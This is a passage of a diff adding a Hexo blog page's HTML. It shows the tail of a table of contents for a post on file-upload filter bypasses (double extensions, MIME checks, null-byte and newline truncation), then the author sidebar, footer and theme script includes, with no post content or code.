href="#6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">6.</span> <span class="nav-text">6.条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E5%8F%8C%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87"><span class="nav-number">7.</span> <span class="nav-text">7.双后缀名绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">8.白名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-MIME%E6%A3%80%E6%9F%A5"><span class="nav-number">8.1.</span> <span class="nav-text">1.MIME检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-00%E6%88%AA%E6%96%AD"><span class="nav-number">8.2.</span> <span class="nav-text">2.%00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-0x00%E6%88%AA%E6%96%AD"><span class="nav-number">8.3.</span> <span class="nav-text">3.0x00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-0x0a%E6%88%AA%E6%96%AD"><span class="nav-number">8.4.</span> <span class="nav-text">4.0x0a截断</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Zhou muyun"
+      src="/images/avatar2.gif">
+  <p class="site-author-name" itemprop="name">Zhou muyun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Liuxunzhang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Liuxunzhang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:liuxunzhang1@gmail.com" title="E-Mail → mailto:liuxunzhang1@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zhou muyun</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
